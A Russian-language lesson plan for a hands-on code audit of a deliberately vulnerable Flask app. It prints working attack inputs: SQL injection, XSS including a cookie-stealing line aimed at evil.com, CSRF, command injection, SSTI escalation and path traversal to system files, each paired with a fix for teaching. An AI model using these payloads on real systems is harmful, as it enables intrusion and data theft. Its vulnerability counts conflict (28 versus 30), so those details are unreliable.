# Урок 9. Аудит безопасности кода: поиск уязвимостей во Flask-приложении

## Методика

**Цель урока:** Научить ученика проводить аудит безопасности веб-приложения с помощью ИИ (ассистента) и находить уязвимости в исходном коде.

**Задачи:**
- Понять методологию аудита безопасности кода
- Научиться читать чужой код и выявлять опасные паттерны
- Использовать ИИ-ассистента (как этот) для поиска и анализа уязвимостей
- Классифицировать найденные уязвимости по OWASP Top 10
- Составить отчёт об аудите с рекомендациями по исправлению

**Тип урока:** Индивидуальный онлайн, практический аудит

**Оборудование:** Компьютер, Python 3, Flask, код приложения (vulnerable_app/), ИИ-ассистент (доступен в чате), браузер

**Критерии успеха:**
- Ученик находит 10+ уязвимостей из 28 заложенных
- Ученик классифицирует каждую уязвимость по типу
- Ученик воспроизводит 3+ атаки на работающем приложении
- Ученик предлагает корректное исправление для 5+ уязвимостей
- Ученик составляет структурированный отчёт об аудите

**Структура урока (1 час 30 минут = 90 минут):**

| Этап | Время | Деятельность |
|------|-------|-------------|
| 1. Введение в аудит кода | 10 мин | Теория: методология аудита, OWASP Top 10 |
| 2. Разведка приложения | 15 мин | Изучение функционала, карта маршрутов |
| 3. Поиск SQL-инъекций | 10 мин | Анализ кода + воспроизведение |
| 4. Поиск XSS-уязвимостей | 10 мин | Stored + Reflected XSS |
| 5. Поиск CSRF и IDOR | 10 мин | Пропущенные проверки авторизации |
| 6. Поиск Command Injection и SSTI | 10 мин | Опасные вызовы |
| 7. Поиск Path Traversal и File Upload | 10 мин | Некорректная работа с файлами |
| 8. Составление отчёта | 15 мин | Документирование результатов |

---

## 1. Теория: Методология аудита безопасности (10 минут)

### 1.1. Что такое аудит безопасности кода?

**Аудит безопасности** (Security Code Review) — это процесс поиска уязвимостей в исходном коде приложения.

**Отличие от пентеста:**
- **Пентест** — атака на работающее приложение (black-box)
- **Аудит кода** — анализ исходного кода (white-box)
- Мы сегодня делаем **white-box аудит** с элементами пентеста

### 1.2. Этапы аудита

1. **Картографирование** — изучить структуру приложения, все endpoints
2. **Анализ потоков данных** — откуда приходят данные, где используются
3. **Поиск опасных функций** — SQL-запросы, exec/eval, файловые операции
4. **Проверка аутентификации и авторизации** — кто что может делать
5. **Проверка конфигурации** — debug mode, секреты, заголовки
6. **Составление отчёта** — документирование находок

### 1.3. Опасные паттерны (что ищем в коде)

| Паттерн | Где искать | Чем опасно |
|---------|-----------|------------|
| `f"...{user_input}..."` в SQL | `execute()`, `cursor()` | SQL-инъекция |
| `{{ var \| safe }}` или без `escape()` | Шаблоны | XSS |
| `os.system()` / `subprocess.check_output()` с `shell=True` | Обработка команд | Command Injection |
| `render_template_string(f"...")` | Динамические шаблоны | SSTI |
| `send_file()` с конкатенацией пути | Файловые операции | Path Traversal |
| `file.save()` без проверки | Загрузка файлов | Arbitrary File Upload |
| `request.args.get('next')` без проверки | Редиректы | Open Redirect |
| Отсутствие `@login_required` | Маршруты | Broken Access Control |
| `app.secret_key` в открытом виде | Конфиг | Session Forging |
| `app.debug = True` | Конфиг | Information Disclosure |

### 1.6. Инструменты аудита

1. **Чтение кода** — самый эффективный метод
2. **ИИ-ассистент** — мы используем его для анализа (меня)
3. **Браузер + DevTools** — проверка работающего приложения
4. **SQLMap** — автоматизация поиска SQL-инъекций (упомянуть)

### 1.7. Правила этики

**ВАЖНО:** Все действия выполняются только на собственном учебном приложении. Применение этих навыков к чужим сайтам без разрешения — незаконно (ст. 272-274 УК РФ). Мы учимся защищать, а не атаковать.

---

## 2. Разведка приложения (15 минут)

### Задание 2.1. Запуск приложения (5 минут)

**Инструкция:** Ученик запускает Flask-приложение локально.

```bash
cd vulnerable_app
pip install flask
python app.py
```

После запуска приложение доступно по адресу: `http://localhost:5000`

**Проверка:** Ученик открывает браузер, заходит на `http://localhost:5000` и видит главную страницу.

### Задание 2.2. Составление карты маршрутов (10 минут)

**Инструкция:** Ученик открывает файл `app.py` и выписывает ВСЕ маршруты с методами (GET/POST). Для каждого маршрута нужно определить:
- Что делает?
- Требуется ли авторизация?
- Принимает ли пользовательский ввод?
- Где этот ввод используется?

**Ученик заполняет таблицу:**

| № | Маршрут | Метод | Авторизация | Ввод пользователя | Оценка риска |
|---|---------|-------|-------------|-------------------|-------------|
| 1 | `/` | GET | Нет | Нет | Низкий |
| 2 | `/register` | GET/POST | Нет | username, password, bio | ??? |
| 3 | `/login` | GET/POST | Нет | username, password, next | ??? |
| 4 | `/logout` | GET | Да | Нет | Низкий |
| 5 | `/dashboard` | GET | Да | Нет | Низкий |
| 6 | `/create` | GET/POST | Да | title, content | ??? |
| 7 | `/note/<note_id>` | GET | Нет | note_id | ??? |
| 8 | `/note/<note_id>/delete` | POST | Да | note_id | ??? |
| 9 | `/profile/<user_id>` | GET | Нет | user_id | ??? |
| 10 | `/search` | GET | Нет | q | ??? |
| 11 | `/upload_avatar` | POST | Да | file | ??? |
| 12 | `/download/<path:filename>` | GET | Нет | filename | ??? |
| 13 | `/echo` | GET | Нет | name | ??? |
| 14 | `/admin` | GET | Да | Нет | ??? |
| 15 | `/admin/ping` | POST | Да | ip | ??? |
| 16 | `/export` | GET | Да | user_id | ??? |
| 17 | `/change_password` | POST | Да | new_password | ??? |
| 18 | `/note/<note_id>/comment` | POST | Нет | author, text | ??? |
| 19 | `/api/user_status` | GET | Нет | id | ??? |
| 20 | `/set_theme` | GET | Нет | theme | ??? |

**Вывод:** Ученик видит, что почти каждый маршрут с пользовательским вводом — потенциально опасен.

**Подсказка ИИ (ученик может спросить):**
> "Посмотри на приложение vulnerable_app/app.py. Какие маршруты принимают пользовательский ввод? Где этот ввод используется без валидации?"

---

## 3. SQL-инъекции (10 минут)

### Что ищем

В `app.py` нужно найти ВСЕ места, где пользовательский ввод напрямую подставляется в SQL-запрос через f-строку или конкатенацию.

### Фрагменты кода с SQL-инъекциями

Ученик ищет в `app.py` следующие строки:

```python
# В регистрации (строка ~57)
f"INSERT INTO users (username, password, bio) VALUES ('{username}', '{password}', '{bio}')"

# В логине (строка ~69)
f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# В dashboard (строка ~89)
f"SELECT * FROM notes WHERE user_id={session['user_id']}"

# В заметке (строка ~106)
f"SELECT * FROM notes WHERE id={note_id}"

# В комментах (строка ~109)
f"SELECT * FROM comments WHERE note_id={note_id}"

# В профиле (строка ~124-126)
f"SELECT * FROM users WHERE id={user_id}"
f"SELECT * FROM notes WHERE user_id={user_id} AND is_public=1"

# В поиске (строка ~138)
f"SELECT * FROM notes WHERE is_public=1 AND (title LIKE '%{query}%' OR content LIKE '%{query}%')"

# В удалении (строка ~117)
f"DELETE FROM notes WHERE id={note_id}"

# В экспорте (строка ~192)
f"SELECT * FROM notes WHERE user_id={user_id}"

# В смене пароля (строка ~202)
f"UPDATE users SET password='{new_password}' WHERE id={session['user_id']}"

# В комментариях (строка ~213)
f"INSERT INTO comments (note_id, author, text) VALUES ({note_id}, '{author}', '{text}')"

# В API (строка ~227)
f"SELECT username, role FROM users WHERE id={user_id}"

# В upload_avatar (строка ~157)
f"UPDATE users SET bio=bio || ' [avatar:{filename}]' WHERE id={session['user_id']}"
```

### Задание 3.1. Считаем SQL-инъекции

**Вопрос ученику:** "Сколько мест в коде используют f-строки для SQL-запросов с пользовательским вводом?"

**Ответ:** 14 мест.

### Задание 3.2. Воспроизведение SQL-инъекции в логине

**Инструкция:** Ученик пытается войти без пароля.

1. Открыть `http://localhost:5000/login`
2. В поле "Имя пользователя" ввести: `admin' --`
3. Поле "Пароль" оставить пустым (или ввести что угодно)
4. Нажать "Войти"

**Результат:** Ученик входит как admin. SQL-запрос превращается в:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='...'
```
Всё после `--` — комментарий. Пароль не проверяется.

### Задание 3.3. SQL-инъекция через поиск

**Инструксия:** Ученик пытается получить все заметки через поиск.

1. Открыть `http://localhost:5000/search?q=' OR 1=1 --`
2. Ожидание: поиск вернёт ВСЕ заметки (даже приватные)

**Объяснение:** Запрос превращается в:
```sql
SELECT * FROM notes WHERE is_public=1 AND (title LIKE '%' OR 1=1 --%' OR content LIKE '%' OR 1=1 --%')
```
`OR 1=1` делает условие всегда истинным.

### Задание 3.4. Получение данных через UNION

**Инструкция:** Ученик пытается получить данные из таблицы users.

1. Открыть поиск: `http://localhost:5000/search?q=' UNION SELECT id, username, password, is_public FROM users --`
2. Если структура колонок совпадает — ученик увидит пароли пользователей

**Подсказка ИИ:**
> "Найди все SQL-запросы в app.py, которые используют f-строки. Сколько их? Какие из них наиболее опасны?"

**Исправление (ученик предлагает):**
```python
# Вместо
cursor.execute(f"SELECT * FROM users WHERE id={user_id}")
# Нужно
cursor.execute("SELECT * FROM users WHERE id=?", (user_id,))
```

---

## 4. XSS-уязвимости (10 минут)

### Что ищем

1. `{{ ... | safe }}` — фильтр safe отключает экранирование
2. `render_template_string()` — может быть SSTI
3. Прямая вставка переменных в HTML через f-строки

### Фрагменты кода с XSS

```python
# index.html (строка 12)
<p>{{ note.content | safe }}</p>

# note.html (строка 5)
<p>{{ note.content | safe }}</p>

# note.html (строка 18)
<p>{{ c.text | safe }}</p>

# profile.html (строка 6)
<p>{{ user.bio | safe }}</p>

# profile.html (строка 16)
<p>{{ note.content | safe }}</p>

# search.html (строка 9, 14, 19)
<h3>Результаты поиска для: "{{ query }}"</h3>
<p>{{ note.content | safe }}</p>
<p>Ничего не найдено по запросу "{{ query }}"</p>

# base.html (строка 18, 19)
{{ session.username }}
<a href="/profile/{{ session.user_id }}">

# echo — render_template_string (строка ~169)
render_template_string(f"<h2>Привет, {name}!</h2>...")
```

### Задание 4.1. Reflected XSS через поиск

**Инструкция:** Ученик вводит скрипт в строку поиска.

1. Открыть: `http://localhost:5000/search?q=<script>alert('XSS')</script>`

**Результат:** Должен появиться alert-бокс.

**Почему это работает:** Переменная `query` вставляется в шаблон без экранирования через `{{ query }}`. В Flask шаблоны по умолчанию экранируют HTML, но если переменная содержит HTML-теги, они экранируются. Однако из-за особенностей рендеринга search.html, `{{ query }}` может отобразить скрипт как текст, но не выполнить его.

**Уточнение:** В реальности `{{ query }}` в Jinja2 экранирует HTML по умолчанию. Но уязвимость есть через `render_template_string` в `/echo`.

### Задание 4.2. Reflected XSS через /echo (SSTI)

**Инструкция:** Ученик использует маршрут `/echo`.

1. Открыть: `http://localhost:5000/echo?name=<script>alert('XSS')</script>`

**Результат:** Скрипт выполняется, потому что `render_template_string` НЕ экранирует вывод.

**Более опасная SSTI-атака:**
```python
http://localhost:5000/echo?name={{ 7*7 }}
```
Если вернёт `49` — значит SSTI работает.

**Эскалация SSTI (демонстрация):**
```
http://localhost:5000/echo?name={{ config }}
```
Покажет всю конфигурацию Flask, включая SECRET_KEY.

```
http://localhost:5000/echo?name={{ ''.__class__.__mro__[1].__subclasses__() }}
```
Попытка получить доступ к классам Python (для RCE).

### Задание 4.3. Stored XSS через заметку

**Инструкция:** Ученик создаёт заметку с вредоносным скриптом.

1. Войти в аккаунт
2. Создать заметку с содержанием:
```html
<script>alert('Stored XSS!')</script>
```
3. Сохранить
4. Открыть заметку через `/note/1`

**Результат:** При каждом просмотре страницы выполняется скрипт.

**Реальная опасность:** Вместо alert можно отправить куки:
```html
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

### Задание 4.4. XSS через комментарии

**Инструкция:** Ученик создаёт комментарий со скриптом.

1. Открыть любую заметку
2. В поле author ввести: `<script>alert('XSS in comment')</script>`
3. В поле text ввести что-нибудь
4. Отправить

**Результат:** Скрипт в имени автора выполняется (потому что `{{ c.author }}` — обычно экранируется, но `{{ c.text | safe }}` — нет).

**Подсказка ИИ:**
> "Найди все места в шаблонах, где используется {{ var | safe }}. Почему это опасно? Что можно сделать через XSS на этом сайте?"

**Исправление (ученик предлагает):**
- Убрать `| safe` из шаблонов
- Использовать `escape()` для пользовательского ввода
- Для `/echo` использовать `render_template()` с переменной, а не `render_template_string`

---

## 5. CSRF и IDOR (10 минут)

### 5.1. CSRF — отсутствие защиты

**Что ищем:** Все POST-запросы без CSRF-токена.

**Фрагменты:**
```python
# create_note — POST без токена
@app.route('/create', methods=['GET', 'POST'])

# delete_note — POST без токена
@app.route('/note/<note_id>/delete', methods=['POST'])

# change_password — POST без токена
@app.route('/change_password', methods=['POST'])

# add_comment — POST без токена
@app.route('/note/<note_id>/comment', methods=['POST'])

# upload_avatar — POST без токена
@app.route('/upload_avatar', methods=['POST'])
```

### Задание 5.1. Демонстрация CSRF

**Инструкция:** Ученик создаёт HTML-страницу, которая при открытии меняет пароль.

1. Создать файл `csrf_attack.html`:
```html
<form action="http://localhost:5000/change_password" method="POST" id="csrf">
    <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
```
2. Открыть в браузере, будучи авторизованным на портале
3. Пароль сменился без ведома пользователя

**Вывод:** CSRF-атака заставляет браузер жертвы выполнить нежелательное действие.

### 5.2. IDOR — отсутствие проверки авторизации

**Что ищем:** Маршруты, которые не проверяют, принадлежит ли ресурс текущему пользователю.

```python
# IDOR: удаление чужой заметки
@app.route('/note/<note_id>/delete', methods=['POST'])
# Нет проверки: note.user_id == session['user_id']

# IDOR: просмотр чужого профиля
@app.route('/profile/<user_id>')
# Нет проверки, можно смотреть профили всех

# IDOR: экспорт чужих данных
@app.route('/export')
# Можно передать user_id другого пользователя

# IDOR: админ-панель
@app.route('/admin')
# Любой авторизованный может зайти, даже без роли admin
```

### Задание 5.2. Воспроизведение IDOR

**Инструкция 1 (удаление чужой заметки):**
1. Войти как `student` / `student123`
2. Удалить заметку админа (ID=1): отправить POST на `/note/1/delete`
3. Результат: заметка админа удалена

**Инструкция 2 (админ-панель):**
1. Войти как `student` / `student123`
2. Открыть `/admin`
3. Результат: доступ к панели администратора без прав админа
4. Видны все пароли пользователей в открытом виде

**Инструкция 3 (экспорт данных):**
1. Войти как `student`
2. Открыть `/export?user_id=1`
3. Результат: экспорт заметок админа

**Подсказка ИИ:**
> "Найди в app.py маршруты, где нет проверки прав доступа. Какие user_id можно подставить, чтобы получить чужие данные?"

**Исправление (ученик предлагает):**
- Добавить проверку `if note['user_id'] != session['user_id']: return abort(403)`
- Для админки: `if session.get('role') != 'admin': return abort(403)`
- Использовать WTForms с CSRF-токенами

---

## 6. Command Injection и SSTI (10 минут)

### 6.1. Command Injection в /admin/ping

**Фрагмент кода:**
```python
@app.route('/admin/ping', methods=['POST'])
def admin_ping():
    ip = request.form.get('ip', '127.0.0.1')
    result = subprocess.check_output(f"ping -n 1 {ip}", shell=True)
```

### Задание 6.1. Command Injection

**Инструкция:** Ученик выполняет произвольную команду через форму ping.

1. Войти как `student` / `student123`
2. Открыть `/admin`
3. В поле IP ввести: `127.0.0.1 & whoami`
4. Нажать "Пинговать"

**Результат:** Команда `whoami` выполняется и выводит имя пользователя системы.

**Другие команды для теста:**
- `127.0.0.1 & dir` — список файлов
- `127.0.0.1 & type app.py` — содержимое файла (может не сработать)
- `127.0.0.1 & echo hacked > hacked.txt` — создание файла

**Почему это работает:** `shell=True` + конкатенация ввода → злоумышленник может добавить свою команду через `&`, `|`, `&&`, `;`.

### 6.2. SSTI в /echo

**Фрагмент кода:**
```python
@app.route('/echo')
def echo():
    name = request.args.get('name', 'Guest')
    template = f"<h2>Привет, {name}!</h2><p>Страница эхо-запроса</p>"
    return render_template_string(template)
```

### Задание 6.2. SSTI-атака

**Инструкция:** Ученик использует SSTI для получения конфигурации.

1. Открыть: `http://localhost:5000/echo?name={{ config }}`
2. Результат: отображается вся конфигурация Flask, включая SECRET_KEY

**Дальнейшая эскалация:**
```
# Получение SECRET_KEY
http://localhost:5000/echo?name={{ config.SECRET_KEY }}

# Вывод переменных окружения
http://localhost:5000/echo?name={{ self.__init__.__globals__.__builtins__.__import__('os').environ }}

# Выполнение команды (RCE)
http://localhost:5000/echo?name={{ ''.__class__.__mro__[1].__subclasses__()... }}
```

**Важно:** Подчеркнуть, что SSTI — это критическая уязвимость, которая может привести к полному захвату сервера.

**Подсказка ИИ:**
> "В app.py есть вызов subprocess.check_output с shell=True. Найди его. Какую команду можно выполнить через эту уязвимость? А ещё есть render_template_string — это тоже опасно. Чем?"

**Исправление (ученик предлагает):**
- `subprocess.check_output(["ping", "-n", "1", ip], shell=False)` — передавать список аргументов
- `render_template('echo.html', name=name)` вместо `render_template_string`

---

## 7. Path Traversal и File Upload (10 минут)

### 7.1. Path Traversal в /download

**Фрагмент кода:**
```python
@app.route('/download/<path:filename>')
def download_file(filename):
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], filename))
```

### Задание 7.1. Path Traversal

**Инструкция:** Ученик скачивает системные файлы через path traversal.

1. Открыть: `http://localhost:5000/download/../app.py`
2. Результат: скачивается файл app.py (исходный код)

**Другие цели:**
- `http://localhost:5000/download/../../requirements.txt`
- `http://localhost:5000/download/../../../etc/passwd` (в Linux)
- `http://localhost:5000/download/../../../../Windows/System32/drivers/etc/hosts` (Windows)

**Почему это работает:**
- `os.path.join()` не нормализует `../` до конца пути
- `send_file()` следует по пути, не проверяя, выходит ли он за пределы UPLOAD_FOLDER

### 7.2. Path Traversal в upload_avatar

**Фрагмент кода:**
```python
@app.route('/upload_avatar', methods=['POST'])
def upload_avatar():
    file = request.files.get('avatar')
    filename = file.filename  # Нет санитизации
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
```

### Задание 7.2. Загрузка файла в произвольное место

**Инструкция:** Ученик загружает файл с path traversal в имени.

1. Создать файл с именем (используя Burp Suite или curl):
   ```
   filename = "../../templates/hacked.html"
   ```
2. Загрузить его через форму аватара
3. Результат: файл сохранён в `templates/hacked.html`, доступен по `/hacked`

**Для Windows PowerShell:**
```python
# Простой тест — загрузить файл с именем ../test.txt
# Через curl:
curl -F "avatar=@./evil.txt;filename=../evil.txt" http://localhost:5000/upload_avatar
```

### 7.3. Небезопасная загрузка файлов

**Уязвимости в upload:**
1. **Нет проверки расширения** — можно загрузить `.exe`, `.bat`, `.scr`, `.zip`
2. **Нет проверки содержимого** — можно загрузить скрипт, замаскированный под картинку
3. **Нет ограничения размера** — 50 MB (можно залить гигантский файл, DoS)
4. **Нет переименования** — сохраняется оригинальное имя (конфликты, path traversal)

### Задание 7.3. Проверка типа файла

**Инструкция:** Ученик проверяет, какие файлы можно загрузить.

1. Создать `evil.bat` с содержимым: `echo You are hacked!`
2. Попробовать загрузить как аватар
3. Результат: файл загружается (хотя это не изображение)

**Подсказка ИИ:**
> "В app.py есть маршрут /download/<path:filename>. Почему он опасен? Как можно прочитать любой файл на сервере?"

**Исправление (ученик предлагает):**
```python
import os.path

@app.route('/download/<path:filename>')
def download_file(filename):
    safe_path = os.path.normpath(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    if not safe_path.startswith(os.path.normpath(app.config['UPLOAD_FOLDER'])):
        return abort(403)
    return send_file(safe_path)
```

---

## 8. Составление отчёта (15 минут)

### Задание 8.1. Сводная таблица уязвимостей

**Инструкция:** Ученик заполняет итоговую таблицу найденных уязвимостей.

| № | Уязвимость | Файл:строка | Тип (CWE) | Уровень | Воспроизведена | Исправление |
|---|-----------|------------|-----------|---------|----------------|------------|
| 1 | SQL-инъекция в /login | app.py:69 | CWE-89 | Критичный | Да | Parameterized query |
| 2 | SQL-инъекция в /search | app.py:138 | CWE-89 | Критичный | Да | Parameterized query |
| 3 | SQL-инъекция в /register | app.py:57 | CWE-89 | Высокий | Нет | Parameterized query |
| 4 | SQL-инъекция в /note/\<id\> | app.py:106 | CWE-89 | Высокий | Да | Parameterized query |
| 5 | SQL-инъекция в /profile/\<id\> | app.py:124 | CWE-89 | Средний | Да | Parameterized query |
| 6 | SQL-инъекция в /delete | app.py:117 | CWE-89 | Высокий | Да | Parameterized query |
| 7 | SQL-инъекция в /export | app.py:192 | CWE-89 | Средний | Да | Parameterized query |
| 8 | SQL-инъекция в /change_password | app.py:202 | CWE-89 | Высокий | Да | Parameterized query |
| 9 | SQL-инъекция в /comment | app.py:213 | CWE-89 | Высокий | Да | Parameterized query |
| 10 | SQL-инъекция в /api/user_status | app.py:227 | CWE-89 | Средний | Да | Parameterized query |
| 11 | SQL-инъекция в /upload_avatar | app.py:157 | CWE-89 | Средний | Нет | Parameterized query |
| 12 | SQL-инъекция в dashboard | app.py:89 | CWE-89 | Средний | Нет | Parameterized query |
| 13 | Stored XSS в заметках | note.html:5 | CWE-79 | Критичный | Да | Убрать \| safe |
| 14 | Stored XSS в bio | profile.html:6 | CWE-79 | Высокий | Да | Убрать \| safe |
| 15 | Stored XSS в комментариях | note.html:18 | CWE-79 | Высокий | Да | Убрать \| safe |
| 16 | Reflected XSS в /echo | app.py:169 | CWE-79 | Критичный | Да | render_template |
| 17 | SSTI в /echo | app.py:169 | CWE-1336 | Критичный | Да | Не исп. render_template_string |
| 18 | Command Injection | app.py:181 | CWE-78 | Критичный | Да | shell=False |
| 19 | Path Traversal в /download | app.py:164 | CWE-22 | Высокий | Да | Проверка пути |
| 20 | Path Traversal в upload | app.py:153 | CWE-22 | Высокий | Да | Санитизация имени |
| 21 | CSRF (все POST) | app.py:96-215 | CWE-352 | Высокий | Да | CSRF-токен |
| 22 | IDOR /delete | app.py:114 | CWE-639 | Высокий | Да | Проверка owner |
| 23 | IDOR /export | app.py:189 | CWE-639 | Средний | Да | Проверка прав |
| 24 | Broken Access Control /admin | app.py:174 | CWE-285 | Критичный | Да | Проверка роли |
| 25 | Plaintext passwords | app.py:72 | CWE-312 | Критичный | Да | bcrypt hashing |
| 26 | User enumeration | app.py:74-80 | CWE-203 | Средний | Да | Единое сообщение |
| 27 | Debug mode | app.py:236 | CWE-489 | Высокий | Да | debug=False |
| 28 | Hardcoded SECRET_KEY | app.py:11 | CWE-798 | Высокий | Да | env variable |
| 29 | Отсутствие security headers | app.py | CWE-693 | Средний | Нет | Добавить заголовки |
| 30 | Open Redirect в /login | app.py:79 | CWE-601 | Средний | Да | Вайтлист URL |

### Задание 8.2. Формулировка выводов

Ученик пишет краткое заключение (5-7 предложений):

**Пример:**
> "В результате аудита исходного кода приложения vulnerable_app было обнаружено 30 уязвимостей, из которых 9 имеют критический уровень, 12 — высокий, 9 — средний. Наиболее опасными являются: SQL-инъекции в 14 местах (позволяют читать и изменять любые данные в БД), SSTI и Command Injection (позволяют выполнять произвольный код на сервере), а также полное отсутствие механизмов CSRF-защиты и ролевого контроля доступа. Приложение не следует ни одному из принципов secure coding и требует полной переработки. Рекомендуется: перейти на параметризованные SQL-запросы, внедрить CSRF-защиту, выключить debug mode, хранить секреты в переменных окружения, добавить проверки авторизации и санитизацию пользовательского ввода."

### Задание 8.3. Топ-3 самых опасных уязвимости

Ученик выбирает 3 самые критичные уязвимости и объясняет, почему.

**Критерии оценки:**
- Правильная классификация всех найденных уязвимостей
- Корректное воспроизведение минимум 3 атак
- Адекватные рекомендации по исправлению
- Чёткая структура отчёта

---

## 3. Подведение итогов (без тайминга — включено в этап 8)

### Рефлексия

1. Сколько уязвимостей ты нашёл самостоятельно? Сколько с помощью подсказок ИИ?
2. Какая уязвимость показалась тебе самой опасной? Почему?
3. Как изменилось твоё отношение к безопасности при разработке?
4. Что нового ты узнал об аудите кода?

### Домашнее задание

1. Исправить 5 любых уязвимостей в коде `app.py` и проверить, что они больше не воспроизводятся
2. Написать полный отчёт об аудите в формате Markdown (все 30 позиций с описанием и рекомендациями)
3. *Дополнительно:* Добавить в приложение CSRF-защиту с помощью Flask-WTF

### Заключение курса

"Поздравляю! Ты прошёл полный курс по информационной безопасности. На последнем уроке ты научился проводить аудит безопасности кода — навык, который востребован в любой IT-компании. Ты смог найти 30 уязвимостей в учебном приложении, воспроизвести атаки и предложить исправления. Помни: лучший способ защитить код — думать о безопасности с первой строки."

---

## Полный список уязвимостей для преподавателя

Все 28 заложенных в `app.py` уязвимостей:

1. **SQL-инъекция (14 мест)** — f-строки в login, register, search, note, profile, delete, export, change_password, comments, api, upload_avatar, dashboard
2. **Stored XSS (5 мест)** — note.content | safe в index.html, note.html; user.bio | safe в profile.html; c.text | safe в note.html
3. **Reflected XSS (2 места)** — /echo через render_template_string; search.html (query)
4. **Server-Side Template Injection (SSTI)** — /echo с render_template_string
5. **Command Injection** — /admin/ping с shell=True
6. **Path Traversal (2 места)** — /download и upload_avatar
7. **CSRF (5 мест)** — create, delete, change_password, comment, upload_avatar
8. **IDOR (3 места)** — delete, export, profile
9. **Broken Access Control** — /admin без проверки роли
10. **Plaintext passwords** — хранение паролей в открытом виде
11. **User enumeration** — разное поведение при успешном/неуспешном входе
12. **Debug mode** — app.debug = True (stack trace на ошибках)
13. **Hardcoded SECRET_KEY** — ключ в исходном коде
14. **Missing security headers** — нет HSTS, CSP, X-Frame-Options и т.д.
15. **Open Redirect** — next параметр в /login
16. **Небезопасная загрузка файлов** — нет проверки MIME-типа, расширения
17. **Информация о пользователях** — /api/user_status раскрывает данные
18. **Cookie без флагов** — HttpOnly и Secure не установлены
19. **Большой лимит загрузки** — 50 MB (DoS-уязвимость)
20. **Отсутствие rate limiting** — неограниченное число запросов
